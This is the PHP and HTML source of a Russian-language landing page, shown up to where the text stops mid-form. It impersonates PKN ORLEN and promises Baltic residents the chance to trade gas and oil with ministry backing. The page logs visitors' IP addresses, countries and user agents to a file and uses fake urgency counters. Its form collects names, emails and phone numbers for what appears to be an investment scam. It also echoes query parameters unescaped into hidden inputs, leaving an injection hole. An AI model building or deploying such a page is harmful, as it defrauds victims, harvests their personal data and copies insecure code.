<?php
$FacebookPixel = $_GET['px'];
$Ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$http_lang = substr($_SERVER["HTTP_ACCEPT_LANGUAGE"],0,2);
$fd = fopen("logs.txt", 'a+');
$date = date('d.m.Y, H:i:s');
$arr = $date.'|'.$_SERVER['HTTP_CF_IPCOUNTRY'].'|'.$http_lang.'|'.$_SERVER['HTTP_REFERER'].'|'.$_SERVER['HTTP_USER_AGENT'].'|'.$Ip."|land \r\n";
fwrite($fd, $arr);
fclose($fd);
$gp = $_GET['gp'];
$hs = $_GET['hs'];
$page_lang = "ru";
$QUERY=$_SERVER["QUERY_STRING"];


?>









<html lang="ru">
  <head>
    <style class="vjs-styles-defaults">
      .video-js {
        width: 300px;
        height: 150px;
      }

      .vjs-fluid {
        padding-top: 56.25%;
      }
    </style>
    <style class="vjs-styles-dimensions">
      .video-dimensions {
        width: 300px;
        height: 168.75px;
      }

      .video-dimensions.vjs-fluid {
        padding-top: 56.25%;
      }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>PKN ORLEN - Газ и электроэнергия</title>
    <link href="css/fonts.css" rel="stylesheet" />
    <link href="css/app.css" rel="stylesheet" />
    <link
      rel="stylesheet"
      type="text/css"
      href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"
    />
    <link rel="stylesheet" href="css/jquery.fancybox.min.css" />

    <link rel="stylesheet" href="js/videoJS/video-js.css" />
   
    
    <link rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/ion-rangeslider/2.3.1/css/ion.rangeSlider.min.css" />
   
    <link rel="stylesheet" href="js/registerForm/registerForm.css" />
    <style>
      .block-post {
        height: 100%;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        align-items: flex-start;
      }
    </style>
    <link rel="apple-touch-icon" sizes="57x57" href="./img/favicon_io/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="./img/favicon_io/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="./img/favicon_io/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="./img/favicon_io/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="./img/favicon_io/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="./img/favicon_io/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="./img/favicon_io/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="./img/favicon_io/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="./img/favicon_io/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192" href="./img/favicon_io/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="./img/favicon_io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="./img/favicon_io/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="./img/favicon_io/favicon-16x16.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <link rel="stylesheet" href="https://usahomerelief.net/adict/intlTelInput.css" />
    <link rel="stylesheet" href="https://usahomerelief.net/adict/adict.css" />
  </head>

  <body class="text-primary font-sans leading-snug">
    <header class="sm:w-full sm:z-50 sm:mb-8">
      <div
        class="container relative flex justify-between items-center mx-auto py-4 mb-6 sm:mb-0"
      >
        <div class="flex w-1/2 md:w-auto">
          <a href="#form" onclick="document.location.hash='';return false;">
            <img style="max-height: 100%" src="img/9.svg" alt="logo" />
          </a>
        </div>
        <div class="flex w-1/2 justify-end items-center">
          <img style="object-fit: contain" src="img/gerb.png" alt="rus" />
        </div>
      </div>
    </header>

    <div
      style="top: 110px"
      class="fixed z-50 w-53 h-13 rounded-custom-right py-2 px-3 flex flex-col bg-secondary text-white shadow text-center left-0 sm:hidden"
    >
      <span id="rand_man">170</span>
      <span
        style="text-transform: uppercase"
        class="tracking-wide whitespace-no-wrap"
      >
        людей на сайте
      </span>
    </div>
    <div
      style="top: 110px"
      class="fixed z-50 w-53 h-13 rounded-custom-left py-2 px-3 flex flex-col bg-secondary text-white shadow text-center right-0 sm:hidden"
    >
      <span id="rand_places">3</span>
      <span style="text-transform: uppercase" class="tracking-wide">
     свободных мест
      </span>
    </div>

    <main class="">
      <section class="container mx-auto mb-16 sm:mb-12 pt-6 sm:pt-0">
        <h1
          class="mt-2 sm:text-3xl text-4xl text-center leading-extra-tight sm:leading-snug font-ubuntu font-black mb-3 sm:mb-6"
        >
        Нефтяной концерн ORLEN <br class="sm:hidden" />
        при поддержке Минэнерго позволил жителям Литвы, Латвии и Эстонии <br class="sm:hidden" />
        Торговать газом и нефтью    
        </h1>
        <h2 class="text-center text-2xl mb-6 sm:text-base">
Теперь национальные ресурсы в ваших руках        </h2>
      </section>

      <section id="about" class="container mx-auto mb-24 sm:mb-24">
        <div class="w-full flex justify-center items-center sm:flex-col">
          <div
            class="relative pr-2 w-2/3 flex sm:pr-0 sm:w-full sm:mr-0 js-vid1 sm:mb-12 sm:block"
          >
            <div
              data-setup='{"controls": true, "autoplay": "any", "preload": "metadata", "fluid": true}'
              loop="true"
              muted="true"
              id="video"
              class="embed-responsive-item video-js vjs-default-skin vjs-big-play-centered video vjs-fluid video-dimensions vjs-workinghover vjs-v7 vjs-has-started vjs-error vjs-controls-disabled vjs-paused vjs-user-inactive"
              lang="pl"
              role="region"
              aria-label="Video Player"
            >
              <video
                class="vjs-tech"
                id="video_html5_api"
                muted="muted"
                loop=""
                data-setup='{"controls": true, "autoplay": "any", "preload": "metadata", "fluid": true}'
                tabindex="-1"
                preload="metadata"
                src="//v.companyapi.info/orlen/STRATEGIA.mp4"
              >
                <source
                  src="//v.companyapi.info/orlen/STRATEGIA.mp4"
                  type="video/mp4"
                />
              </video>
              <div
                class="vjs-poster vjs-hidden"
                tabindex="-1"
                aria-disabled="false"
              ></div>
              <div
                class="vjs-text-track-display"
                aria-live="off"
                aria-atomic="true"
              ></div>
              <div class="vjs-loading-spinner" dir="ltr">
                <span class="vjs-control-text">Video Player is loading.</span>
              </div>
              <button
                class="vjs-big-play-button"
                type="button"
                title="Play Video"
                aria-disabled="false"
              >
                <span aria-hidden="true" class="vjs-icon-placeholder"></span
                ><span class="vjs-control-text" aria-live="polite"
                  >Play Video</span
                >
              </button>
              <div class="vjs-control-bar" dir="ltr">
                <button
                  class="vjs-play-control vjs-control vjs-button vjs-paused"
                  type="button"
                  title="Play"
                  aria-disabled="false"
                >
                  <span aria-hidden="true" class="vjs-icon-placeholder"></span
                  ><span class="vjs-control-text" aria-live="polite">Play</span>
                </button>
                <div
                  class="vjs-volume-panel vjs-control vjs-volume-panel-horizontal"
                >
                  <button
                    class="vjs-mute-control vjs-control vjs-button vjs-vol-0"
                    type="button"
                    title="Unmute"
                    aria-disabled="false"
                  >
                    <span aria-hidden="true" class="vjs-icon-placeholder"></span
                    ><span class="vjs-control-text" aria-live="polite"
                      >Unmute</span
                    >
                  </button>
                  <div
                    class="vjs-volume-control vjs-control vjs-volume-horizontal"
                  >
                    <div
                      tabindex="0"
                      class="vjs-volume-bar vjs-slider-bar vjs-slider vjs-slider-horizontal"
                      role="slider"
                      aria-valuenow="0"
                      aria-valuemin="0"
                      aria-valuemax="100"
                      aria-label="Volume Level"
                      aria-live="polite"
                      aria-valuetext="0%"
                    >
                      <div class="vjs-volume-level">
                        <span class="vjs-control-text"></span>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="vjs-current-time vjs-time-control vjs-control">
                  <span class="vjs-control-text">Current Time&nbsp;</span
                  ><span class="vjs-current-time-display" aria-live="off"
                    >0:00</span
                  >
                </div>
                <div class="vjs-time-control vjs-time-divider">
                  <div><span>/</span></div>
                </div>
                <div class="vjs-duration vjs-time-control vjs-control">
                  <span class="vjs-control-text">Duration&nbsp;</span
                  ><span class="vjs-duration-display" aria-live="off"
                    >0:00</span
                  >
                </div>
                <div class="vjs-progress-control vjs-control">
                  <div
                    tabindex="0"
                    class="vjs-progress-holder vjs-slider vjs-slider-horizontal"
                    role="slider"
                    aria-valuenow="0.00"
                    aria-valuemin="0"
                    aria-valuemax="100"
                    aria-label="Progress Bar"
                    aria-valuetext="0:00 of -:-"
                  >
                    <div class="vjs-load-progress">
                      <span class="vjs-control-text"
                        ><span>Loaded</span>: 0%</span
                      >
                    </div>
                    <div class="vjs-mouse-display">
                      <div class="vjs-time-tooltip"></div>
                    </div>
                    <div
                      class="vjs-play-progress vjs-slider-bar"
                      style="width: 0%"
                    >
                      <div class="vjs-time-tooltip">0:00</div>
                      <span class="vjs-control-text"
                        ><span>Progress</span>: 0%</span
                      >
                    </div>
                  </div>
                </div>
                <div class="vjs-live-control vjs-control vjs-hidden">
                  <div class="vjs-live-display" aria-live="off">
                    <span class="vjs-control-text">Stream Type&nbsp;</span>LIVE
                  </div>
                </div>
                <div class="vjs-remaining-time vjs-time-control vjs-control">
                  <span class="vjs-control-text">Remaining Time&nbsp;</span
                  ><span class="vjs-remaining-time-display" aria-live="off"
                    >-0:00</span
                  >
                </div>
                <div class="vjs-custom-control-spacer vjs-spacer">&nbsp;</div>
                <div
                  class="vjs-playback-rate vjs-menu-button vjs-menu-button-popup vjs-control vjs-button vjs-hidden"
                >
                  <button
                    class="vjs-playback-rate vjs-menu-button vjs-menu-button-popup vjs-button"
                    type="button"
                    aria-disabled="false"
                    title="Playback Rate"
                    aria-haspopup="true"
                    aria-expanded="false"
                  >
                    <span aria-hidden="true" class="vjs-icon-placeholder"></span
                    ><span class="vjs-control-text" aria-live="polite"
                      >Playback Rate</span
                    >
                  </button>
                  <div class="vjs-menu">
                    <ul class="vjs-menu-content" role="menu"></ul>
                  </div>
                  <div class="vjs-playback-rate-value">1x</div>
                </div>
                <div
                  class="vjs-chapters-button vjs-menu-button vjs-menu-button-popup vjs-control vjs-button vjs-hidden"
                >
                  <button
                    class="vjs-chapters-button vjs-menu-button vjs-menu-button-popup vjs-button"
                    type="button"
                    aria-disabled="false"
                    title="Chapters"
                    aria-haspopup="true"
                    aria-expanded="false"
                  >
                    <span aria-hidden="true" class="vjs-icon-placeholder"></span
                    ><span class="vjs-control-text" aria-live="polite"
                      >Chapters</span
                    >
                  </button>
                  <div class="vjs-menu">
                    <ul class="vjs-menu-content" role="menu">
                      <li class="vjs-menu-title" tabindex="-1">Chapters</li>
                    </ul>
                  </div>
                </div>
                <div
                  class="vjs-descriptions-button vjs-menu-button vjs-menu-button-popup vjs-control vjs-button vjs-hidden"
                >
                  <button
                    class="vjs-descriptions-button vjs-menu-button vjs-menu-button-popup vjs-button"
                    type="button"
                    aria-disabled="false"
                    title="Descriptions"
                    aria-haspopup="true"
                    aria-expanded="false"
                  >
                    <span aria-hidden="true" class="vjs-icon-placeholder"></span
                    ><span class="vjs-control-text" aria-live="polite"
                      >Descriptions</span
                    >
                  </button>
                  <div class="vjs-menu">
                    <ul class="vjs-menu-content" role="menu">
                      <li
                        class="vjs-menu-item vjs-selected"
                        tabindex="-1"
                        role="menuitemradio"
                        aria-disabled="false"
                        aria-checked="true"
                      >
                        <span class="vjs-menu-item-text">descriptions off</span
                        ><span class="vjs-control-text" aria-live="polite"
                          >, selected</span
                        >
                      </li>
                    </ul>
                  </div>
                </div>
                <div
                  class="vjs-subs-caps-button vjs-menu-button vjs-menu-button-popup vjs-control vjs-button vjs-hidden"
                >
                  <button
                    class="vjs-subs-caps-button vjs-menu-button vjs-menu-button-popup vjs-button"
                    type="button"
                    aria-disabled="false"
                    title="Subtitles"
                    aria-haspopup="true"
                    aria-expanded="false"
                  >
                    <span aria-hidden="true" class="vjs-icon-placeholder"></span
                    ><span class="vjs-control-text" aria-live="polite"
                      >Subtitles</span
                    >
                  </button>
                  <div class="vjs-menu">
                    <ul class="vjs-menu-content" role="menu">
                      <li
                        class="vjs-menu-item vjs-texttrack-settings"
                        tabindex="-1"
                        role="menuitem"
                        aria-disabled="false"
                      >
                        <span class="vjs-menu-item-text"
                          >subtitles settings</span
                        ><span class="vjs-control-text" aria-live="polite"
                          >, opens subtitles settings dialog</span
                        >
                      </li>
                      <li
                        class="vjs-menu-item vjs-selected"
                        tabindex="-1"
                        role="menuitemradio"
                        aria-disabled="false"
                        aria-checked="true"
                      >
                        <span class="vjs-menu-item-text">subtitles off</span
                        ><span class="vjs-control-text" aria-live="polite"
                          >, selected</span
                        >
                      </li>
                    </ul>
                  </div>
                </div>
                <div
                  class="vjs-audio-button vjs-menu-button vjs-menu-button-popup vjs-control vjs-button vjs-hidden"
                >
                  <button
                    class="vjs-audio-button vjs-menu-button vjs-menu-button-popup vjs-button"
                    type="button"
                    aria-disabled="false"
                    title="Audio Track"
                    aria-haspopup="true"
                    aria-expanded="false"
                  >
                    <span aria-hidden="true" class="vjs-icon-placeholder"></span
                    ><span class="vjs-control-text" aria-live="polite"
                      >Audio Track</span
                    >
                  </button>
                  <div class="vjs-menu">
                    <ul class="vjs-menu-content" role="menu"></ul>
                  </div>
                </div>
                <button
                  class="vjs-fullscreen-control vjs-control vjs-button"
                  type="button"
                  title="Fullscreen"
                  aria-disabled="false"
                >
                  <span aria-hidden="true" class="vjs-icon-placeholder"></span
                  ><span class="vjs-control-text" aria-live="polite"
                    >Fullscreen</span
                  >
                </button>
              </div>
              <div
                class="vjs-error-display vjs-modal-dialog"
                tabindex="-1"
                aria-describedby="video_component_358_description"
                aria-hidden="false"
                aria-label="Modal Window"
                role="dialog"
              >
                <p
                  class="vjs-modal-dialog-description vjs-control-text"
                  id="video_component_358_description"
                >
                  This is a modal window.
                </p>
                <div class="vjs-modal-dialog-content" role="document">
                  The media could not be loaded, either because the server or
                  network failed or because the format is not supported.
                </div>
              </div>
              <div
                class="vjs-modal-dialog vjs-hidden vjs-text-track-settings"
                tabindex="-1"
                aria-describedby="video_component_364_description"
                aria-hidden="true"
                aria-label="Caption Settings Dialog"
                role="dialog"
              >
                <p
                  class="vjs-modal-dialog-description vjs-control-text"
                  id="video_component_364_description"
                >
                  Beginning of dialog window. Escape will cancel and close the
                  window.
                </p>
                <div class="vjs-modal-dialog-content" role="document">
                  <div class="vjs-track-settings-colors">
                    <fieldset class="vjs-fg-color vjs-track-setting">
                      <legend id="captions-text-legend-video_component_364">
                        Text
                      </legend>
                      <label
                        id="captions-foreground-color-video_component_364"
                        class="vjs-label"
                        >Color</label
                      ><select
                        aria-labelledby="captions-text-legend-video_component_364 captions-foreground-color-video_component_364"
                      >
                        <option
                          id="captions-foreground-color-video_component_364-White"
                          value="#FFF"
                          aria-labelledby="captions-text-legend-video_component_364 captions-foreground-color-video_component_364 captions-foreground-color-video_component_364-White"
                        >
                          White
                        </option>
                        <option
                          id="captions-foreground-color-video_component_364-Black"
                          value="#000"
                          aria-labelledby="captions-text-legend-video_component_364 captions-foreground-color-video_component_364 captions-foreground-color-video_component_364-Black"
                        >
                          Black
                        </option>
                        <option
                          id="captions-foreground-color-video_component_364-Red"
                          value="#F00"
                          aria-labelledby="captions-text-legend-video_component_364 captions-foreground-color-video_component_364 captions-foreground-color-video_component_364-Red"
                        >
                          Red
                        </option>
                        <option
                          id="captions-foreground-color-video_component_364-Green"
                          value="#0F0"
                          aria-labelledby="captions-text-legend-video_component_364 captions-foreground-color-video_component_364 captions-foreground-color-video_component_364-Green"
                        >
                          Green
                        </option>
                        <option
                          id="captions-foreground-color-video_component_364-Blue"
                          value="#00F"
                          aria-labelledby="captions-text-legend-video_component_364 captions-foreground-color-video_component_364 captions-foreground-color-video_component_364-Blue"
                        >
                          Blue
                        </option>
                        <option
                          id="captions-foreground-color-video_component_364-Yellow"
                          value="#FF0"
                          aria-labelledby="captions-text-legend-video_component_364 captions-foreground-color-video_component_364 captions-foreground-color-video_component_364-Yellow"
                        >
                          Yellow
                        </option>
                        <option
                          id="captions-foreground-color-video_component_364-Magenta"
                          value="#F0F"
                          aria-labelledby="captions-text-legend-video_component_364 captions-foreground-color-video_component_364 captions-foreground-color-video_component_364-Magenta"
                        >
                          Magenta
                        </option>
                        <option
                          id="captions-foreground-color-video_component_364-Cyan"
                          value="#0FF"
                          aria-labelledby="captions-text-legend-video_component_364 captions-foreground-color-video_component_364 captions-foreground-color-video_component_364-Cyan"
                        >
                          Cyan
                        </option></select
                      ><span class="vjs-text-opacity vjs-opacity"
                        ><label
                          id="captions-foreground-opacity-video_component_364"
                          class="vjs-label"
                          >Transparency</label
                        ><select
                          aria-labelledby="captions-text-legend-video_component_364 captions-foreground-opacity-video_component_364"
                        >
                          <option
                            id="captions-foreground-opacity-video_component_364-Opaque"
                            value="1"
                            aria-labelledby="captions-text-legend-video_component_364 captions-foreground-opacity-video_component_364 captions-foreground-opacity-video_component_364-Opaque"
                          >
                            Opaque
                          </option>
                          <option
                            id="captions-foreground-opacity-video_component_364-SemiTransparent"
                            value="0.5"
                            aria-labelledby="captions-text-legend-video_component_364 captions-foreground-opacity-video_component_364 captions-foreground-opacity-video_component_364-SemiTransparent"
                          >
                            Semi-Transparent
                          </option>
                        </select></span
                      >
                    </fieldset>
                    <fieldset class="vjs-bg-color vjs-track-setting">
                      <legend id="captions-background-video_component_364">
                        Background
                      </legend>
                      <label
                        id="captions-background-color-video_component_364"
                        class="vjs-label"
                        >Color</label
                      ><select
                        aria-labelledby="captions-background-video_component_364 captions-background-color-video_component_364"
                      >
                        <option
                          id="captions-background-color-video_component_364-Black"
                          value="#000"
                          aria-labelledby="captions-background-video_component_364 captions-background-color-video_component_364 captions-background-color-video_component_364-Black"
                        >
                          Black
                        </option>
                        <option
                          id="captions-background-color-video_component_364-White"
                          value="#FFF"
                          aria-labelledby="captions-background-video_component_364 captions-background-color-video_component_364 captions-background-color-video_component_364-White"
                        >
                          White
                        </option>
                        <option
                          id="captions-background-color-video_component_364-Red"
                          value="#F00"
                          aria-labelledby="captions-background-video_component_364 captions-background-color-video_component_364 captions-background-color-video_component_364-Red"
                        >
                          Red
                        </option>
                        <option
                          id="captions-background-color-video_component_364-Green"
                          value="#0F0"
                          aria-labelledby="captions-background-video_component_364 captions-background-color-video_component_364 captions-background-color-video_component_364-Green"
                        >
                          Green
                        </option>
                        <option
                          id="captions-background-color-video_component_364-Blue"
                          value="#00F"
                          aria-labelledby="captions-background-video_component_364 captions-background-color-video_component_364 captions-background-color-video_component_364-Blue"
                        >
                          Blue
                        </option>
                        <option
                          id="captions-background-color-video_component_364-Yellow"
                          value="#FF0"
                          aria-labelledby="captions-background-video_component_364 captions-background-color-video_component_364 captions-background-color-video_component_364-Yellow"
                        >
                          Yellow
                        </option>
                        <option
                          id="captions-background-color-video_component_364-Magenta"
                          value="#F0F"
                          aria-labelledby="captions-background-video_component_364 captions-background-color-video_component_364 captions-background-color-video_component_364-Magenta"
                        >
                          Magenta
                        </option>
                        <option
                          id="captions-background-color-video_component_364-Cyan"
                          value="#0FF"
                          aria-labelledby="captions-background-video_component_364 captions-background-color-video_component_364 captions-background-color-video_component_364-Cyan"
                        >
                          Cyan
                        </option></select
                      ><span class="vjs-bg-opacity vjs-opacity"
                        ><label
                          id="captions-background-opacity-video_component_364"
                          class="vjs-label"
                          >Transparency</label
                        ><select
                          aria-labelledby="captions-background-video_component_364 captions-background-opacity-video_component_364"
                        >
                          <option
                            id="captions-background-opacity-video_component_364-Opaque"
                            value="1"
                            aria-labelledby="captions-background-video_component_364 captions-background-opacity-video_component_364 captions-background-opacity-video_component_364-Opaque"
                          >
                            Opaque
                          </option>
                          <option
                            id="captions-background-opacity-video_component_364-SemiTransparent"
                            value="0.5"
                            aria-labelledby="captions-background-video_component_364 captions-background-opacity-video_component_364 captions-background-opacity-video_component_364-SemiTransparent"
                          >
                            Semi-Transparent
                          </option>
                          <option
                            id="captions-background-opacity-video_component_364-Transparent"
                            value="0"
                            aria-labelledby="captions-background-video_component_364 captions-background-opacity-video_component_364 captions-background-opacity-video_component_364-Transparent"
                          >
                            Transparent
                          </option>
                        </select></span
                      >
                    </fieldset>
                    <fieldset class="vjs-window-color vjs-track-setting">
                      <legend id="captions-window-video_component_364">
                        Window
                      </legend>
                      <label
                        id="captions-window-color-video_component_364"
                        class="vjs-label"
                        >Color</label
                      ><select
                        aria-labelledby="captions-window-video_component_364 captions-window-color-video_component_364"
                      >
                        <option
                          id="captions-window-color-video_component_364-Black"
                          value="#000"
                          aria-labelledby="captions-window-video_component_364 captions-window-color-video_component_364 captions-window-color-video_component_364-Black"
                        >
                          Black
                        </option>
                        <option
                          id="captions-window-color-video_component_364-White"
                          value="#FFF"
                          aria-labelledby="captions-window-video_component_364 captions-window-color-video_component_364 captions-window-color-video_component_364-White"
                        >
                          White
                        </option>
                        <option
                          id="captions-window-color-video_component_364-Red"
                          value="#F00"
                          aria-labelledby="captions-window-video_component_364 captions-window-color-video_component_364 captions-window-color-video_component_364-Red"
                        >
                          Red
                        </option>
                        <option
                          id="captions-window-color-video_component_364-Green"
                          value="#0F0"
                          aria-labelledby="captions-window-video_component_364 captions-window-color-video_component_364 captions-window-color-video_component_364-Green"
                        >
                          Green
                        </option>
                        <option
                          id="captions-window-color-video_component_364-Blue"
                          value="#00F"
                          aria-labelledby="captions-window-video_component_364 captions-window-color-video_component_364 captions-window-color-video_component_364-Blue"
                        >
                          Blue
                        </option>
                        <option
                          id="captions-window-color-video_component_364-Yellow"
                          value="#FF0"
                          aria-labelledby="captions-window-video_component_364 captions-window-color-video_component_364 captions-window-color-video_component_364-Yellow"
                        >
                          Yellow
                        </option>
                        <option
                          id="captions-window-color-video_component_364-Magenta"
                          value="#F0F"
                          aria-labelledby="captions-window-video_component_364 captions-window-color-video_component_364 captions-window-color-video_component_364-Magenta"
                        >
                          Magenta
                        </option>
                        <option
                          id="captions-window-color-video_component_364-Cyan"
                          value="#0FF"
                          aria-labelledby="captions-window-video_component_364 captions-window-color-video_component_364 captions-window-color-video_component_364-Cyan"
                        >
                          Cyan
                        </option></select
                      ><span class="vjs-window-opacity vjs-opacity"
                        ><label
                          id="captions-window-opacity-video_component_364"
                          class="vjs-label"
                          >Transparency</label
                        ><select
                          aria-labelledby="captions-window-video_component_364 captions-window-opacity-video_component_364"
                        >
                          <option
                            id="captions-window-opacity-video_component_364-Transparent"
                            value="0"
                            aria-labelledby="captions-window-video_component_364 captions-window-opacity-video_component_364 captions-window-opacity-video_component_364-Transparent"
                          >
                            Transparent
                          </option>
                          <option
                            id="captions-window-opacity-video_component_364-SemiTransparent"
                            value="0.5"
                            aria-labelledby="captions-window-video_component_364 captions-window-opacity-video_component_364 captions-window-opacity-video_component_364-SemiTransparent"
                          >
                            Semi-Transparent
                          </option>
                          <option
                            id="captions-window-opacity-video_component_364-Opaque"
                            value="1"
                            aria-labelledby="captions-window-video_component_364 captions-window-opacity-video_component_364 captions-window-opacity-video_component_364-Opaque"
                          >
                            Opaque
                          </option>
                        </select></span
                      >
                    </fieldset>
                  </div>
                  <div class="vjs-track-settings-font">
                    <fieldset class="vjs-font-percent vjs-track-setting">
                      <legend
                        id="captions-font-size-video_component_364"
                        class=""
                      >
                        Font Size
                      </legend>
                      <select
                        aria-labelledby="captions-font-size-video_component_364"
                      >
                        <option
                          id="captions-font-size-video_component_364-50"
                          value="0.50"
                          aria-labelledby="captions-font-size-video_component_364 captions-font-size-video_component_364-50"
                        >
                          50%
                        </option>
                        <option
                          id="captions-font-size-video_component_364-75"
                          value="0.75"
                          aria-labelledby="captions-font-size-video_component_364 captions-font-size-video_component_364-75"
                        >
                          75%
                        </option>
                        <option
                          id="captions-font-size-video_component_364-100"
                          value="1.00"
                          aria-labelledby="captions-font-size-video_component_364 captions-font-size-video_component_364-100"
                        >
                          100%
                        </option>
                        <option
                          id="captions-font-size-video_component_364-125"
                          value="1.25"
                          aria-labelledby="captions-font-size-video_component_364 captions-font-size-video_component_364-125"
                        >
                          125%
                        </option>
                        <option
                          id="captions-font-size-video_component_364-150"
                          value="1.50"
                          aria-labelledby="captions-font-size-video_component_364 captions-font-size-video_component_364-150"
                        >
                          150%
                        </option>
                        <option
                          id="captions-font-size-video_component_364-175"
                          value="1.75"
                          aria-labelledby="captions-font-size-video_component_364 captions-font-size-video_component_364-175"
                        >
                          175%
                        </option>
                        <option
                          id="captions-font-size-video_component_364-200"
                          value="2.00"
                          aria-labelledby="captions-font-size-video_component_364 captions-font-size-video_component_364-200"
                        >
                          200%
                        </option>
                        <option
                          id="captions-font-size-video_component_364-300"
                          value="3.00"
                          aria-labelledby="captions-font-size-video_component_364 captions-font-size-video_component_364-300"
                        >
                          300%
                        </option>
                        <option
                          id="captions-font-size-video_component_364-400"
                          value="4.00"
                          aria-labelledby="captions-font-size-video_component_364 captions-font-size-video_component_364-400"
                        >
                          400%
                        </option>
                      </select>
                    </fieldset>
                    <fieldset class="vjs-edge-style vjs-track-setting">
                      <legend id="video_component_364" class="">
                        Text Edge Style
                      </legend>
                      <select aria-labelledby="video_component_364">
                        <option
                          id="video_component_364-None"
                          value="none"
                          aria-labelledby="video_component_364 video_component_364-None"
                        >
                          None
                        </option>
                        <option
                          id="video_component_364-Raised"
                          value="raised"
                          aria-labelledby="video_component_364 video_component_364-Raised"
                        >
                          Raised
                        </option>
                        <option
                          id="video_component_364-Depressed"
                          value="depressed"
                          aria-labelledby="video_component_364 video_component_364-Depressed"
                        >
                          Depressed
                        </option>
                        <option
                          id="video_component_364-Uniform"
                          value="uniform"
                          aria-labelledby="video_component_364 video_component_364-Uniform"
                        >
                          Uniform
                        </option>
                        <option
                          id="video_component_364-Dropshadow"
                          value="dropshadow"
                          aria-labelledby="video_component_364 video_component_364-Dropshadow"
                        >
                          Dropshadow
                        </option>
                      </select>
                    </fieldset>
                    <fieldset class="vjs-font-family vjs-track-setting">
                      <legend
                        id="captions-font-family-video_component_364"
                        class=""
                      >
                        Font Family
                      </legend>
                      <select
                        aria-labelledby="captions-font-family-video_component_364"
                      >
                        <option
                          id="captions-font-family-video_component_364-ProportionalSansSerif"
                          value="proportionalSansSerif"
                          aria-labelledby="captions-font-family-video_component_364 captions-font-family-video_component_364-ProportionalSansSerif"
                        >
                          Proportional Sans-Serif
                        </option>
                        <option
                          id="captions-font-family-video_component_364-MonospaceSansSerif"
                          value="monospaceSansSerif"
                          aria-labelledby="captions-font-family-video_component_364 captions-font-family-video_component_364-MonospaceSansSerif"
                        >
                          Monospace Sans-Serif
                        </option>
                        <option
                          id="captions-font-family-video_component_364-ProportionalSerif"
                          value="proportionalSerif"
                          aria-labelledby="captions-font-family-video_component_364 captions-font-family-video_component_364-ProportionalSerif"
                        >
                          Proportional Serif
                        </option>
                        <option
                          id="captions-font-family-video_component_364-MonospaceSerif"
                          value="monospaceSerif"
                          aria-labelledby="captions-font-family-video_component_364 captions-font-family-video_component_364-MonospaceSerif"
                        >
                          Monospace Serif
                        </option>
                        <option
                          id="captions-font-family-video_component_364-Casual"
                          value="casual"
                          aria-labelledby="captions-font-family-video_component_364 captions-font-family-video_component_364-Casual"
                        >
                          Casual
                        </option>
                        <option
                          id="captions-font-family-video_component_364-Script"
                          value="script"
                          aria-labelledby="captions-font-family-video_component_364 captions-font-family-video_component_364-Script"
                        >
                          Script
                        </option>
                        <option
                          id="captions-font-family-video_component_364-SmallCaps"
                          value="small-caps"
                          aria-labelledby="captions-font-family-video_component_364 captions-font-family-video_component_364-SmallCaps"
                        >
                          Small Caps
                        </option>
                      </select>
                    </fieldset>
                  </div>
                  <div class="vjs-track-settings-controls">
                    <button
                      class="vjs-default-button"
                      title="restore all settings to the default values"
                    >
                      Reset<span class="vjs-control-text">
                        restore all settings to the default values</span
                      ></button
                    ><button class="vjs-done-button">Done</button>
                  </div>
                </div>
                <button
                  class="vjs-close-button vjs-control vjs-button"
                  type="button"
                  aria-disabled="false"
                  title="Close Modal Dialog"
                >
                  <span aria-hidden="true" class="vjs-icon-placeholder"></span
                  ><span class="vjs-control-text" aria-live="polite"
                    >Close Modal Dialog</span
                  >
                </button>
                <p class="vjs-control-text">End of dialog window.</p>
              </div>
            </div>
          </div>

          <div class="pl-6 block w-1/3 sm:p-0 sm:w-full">
            <div
              class="form-box bg-white pt-6 pb-4 px-6 rounded-custom text-primary shadow-form"
            >
              <h3
                class="text-2xl text-center font-bold font-ubuntu mb-6 sm:mb-10"
              >
                Начните зарабатывать на ресурсах
              </h3>
           <form method="POST" action="thanks/index.php" class="form-container">
              <div class="reg-form__preloader hidden">
                <img src="img/preloader.gif" alt="" class="reg-form__preloader-img" />
              </div>
              <div class="form_group--name">
            
                <input class="form-input" type="text" name="f_name" placeholder="Имя" required="" />
              </div>
              <div class="form_group--name">
            
                <input class="form-input" type="text" name="l_name" placeholder="Фамилия" required="" />
              </div>
              <div class="form_group--email">
                <input class="form-input" type="email" name="email" placeholder="E-mail" required="" />
              </div>
                               <input class="form-input" name="phone" type="tel" required="" />

              <div class="form_group--button">
                <button  class="send-form btn btn-primary" type="submit">
                  <span  class="button--inner">Регистрация</span>
                </button>
              </div>
              <div class="form_input--hidden">
                <input type="hidden" name="phone2" class="phone2" autocomplete="off" required />
                <input type="hidden" name="pixel_id" value="<?php echo $FacebookPixel?>" />
                <input type="hidden" name="page_lang" value="<?php echo $page_lang?>" />
                <input type="hidden" name="query" value="<?php echo $QUERY?>" />
                <input type="hidden" name="gp_id" value="<?php echo $gp?>" />
                <input type="hidden" name="hs_id" value="<?php echo $hs?>" />
                <input type="hidden" name="ip" id="ip" />
                <input type="hidden" name="landing" value="ORLEN-RU" />
                <input type="hidden" name="description" value="ORLEN-RU" />
                <input type="hidden" name="add_inputs" id="desc" value="" />
